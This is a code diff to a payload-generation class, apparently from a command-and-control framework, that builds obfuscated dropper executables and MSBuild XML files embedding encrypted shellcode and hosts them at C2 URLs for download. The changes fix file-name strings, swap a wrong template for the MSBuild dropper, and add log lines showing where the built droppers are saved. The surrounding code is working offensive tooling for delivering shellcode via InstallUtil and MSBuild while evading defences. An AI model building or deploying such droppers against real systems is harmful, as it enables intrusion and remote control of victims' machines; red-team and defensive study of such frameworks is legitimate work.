@@ -730,11 +730,13 @@ class Payloads(object):
         subprocess.check_output(
             f"~/.dotnet/dotnet {PayloadTemplatesDirectory}../SharpGen/bin/Debug/netcoreapp2.1/SharpGen.dll -p {arch} -o console -f {self.BaseDirectory}{name}PInvokeInstallUtilDropper_{arch}.exe -s {self.BaseDirectory}{name}PInvokeInstallUtilDropper_{arch}.cs --confuse {PayloadTemplatesDirectory}../SharpGen/confuseInstallUtil.cr", shell=True)
 
-        insert_hosted_file("%s%s_pinstallUtil_b64" % (self.QuickCommand, name), f"{self.BaseDirectory}{name}_InstallUtilDropper_{arch}.exe",
+        insert_hosted_file("%s%spinstallUtil_b64" % (self.QuickCommand, name), f"{self.BaseDirectory}{name}_InstallUtilDropper_{arch}.exe",
                            "text/html", "Yes", "Yes")
-        insert_hosted_file("%s%s_pinstallUtil" % (self.QuickCommand, name),
+        insert_hosted_file("%s%spinstallUtil" % (self.QuickCommand, name),
                            f"{self.BaseDirectory}{name}PInvokeInstallUtilDropper_{arch}.exe",
                            "application/octet-stream", "No", "Yes")
+
+        self.QuickstartLog(f"available here: {self.BaseDirectory}{name}PInvokeInstallUtilDropper_{arch}.exe")
         self.QuickstartLog(f"hosted at {self.FirstURL}/{self.QuickCommand}{name}pinstallUtil")
         self.QuickstartLog(f"base64 hosted at {self.FirstURL}/{self.QuickCommand}{name}pinstallUtil_b64")
 
@@ -770,12 +772,14 @@ class Payloads(object):
         insert_hosted_file("%s%spinvoke" % (self.QuickCommand, name),
                            f"{self.BaseDirectory}{name}PInvokeEXEdropper_{arch}.exe",
                            "application/octet-stream", "No", "Yes")
+
+        self.QuickstartLog(f"available here: {self.BaseDirectory}{name}PInvokeEXEdropper_{arch}.exe")
         self.QuickstartLog(f"hosted at {self.FirstURL}/{self.QuickCommand}{name}pinvoke")
         self.QuickstartLog(f"base64 hosted at {self.FirstURL}/{self.QuickCommand}{name}pinvoke_b64")
 
     def CreatePMsbuild(self,shellcodePath,arch,name=""):
         self.QuickstartLog(Colours.END)
-        self.QuickstartLog("PInvokeEXE payload files:")
+        self.QuickstartLog("PMsbuild payload files:")
 
         with open(shellcodePath, 'rb') as f:
             shellcode = bytearray(f.read())
@@ -790,7 +794,7 @@ class Payloads(object):
 
         b64shellcode = base64.b64encode(bytes(shellcode)).decode('UTF-8')
         b64key = base64.b64encode(bytes(key)).decode('UTF-8')
-        source = self.PInvokeEXE.replace("##BASE64SHELLCODE##", b64shellcode). \
+        source = self.PMsbuild.replace("##BASE64SHELLCODE##", b64shellcode). \
             replace("##BASE64KEY##", b64key).\
             replace("#REPLACEMERANDSTRING#",str(randomuri()))
 
@@ -803,6 +807,7 @@ class Payloads(object):
         insert_hosted_file("%s%spmsbuild" % (self.QuickCommand, name),
                            f"{self.BaseDirectory}{name}PMsbuildDropper_{arch}.xml",
                            "application/octet-stream", "No", "Yes")
+        self.QuickstartLog("available here: %s%sPMsbuildDropper_%s.xml" % (self.BaseDirectory, name,arch))
         self.QuickstartLog(f"hosted at {self.FirstURL}/{self.QuickCommand}{name}pmsbuild")
         self.QuickstartLog(f"base64 hosted at {self.FirstURL}/{self.QuickCommand}{name}pmsbuild_b64")
 
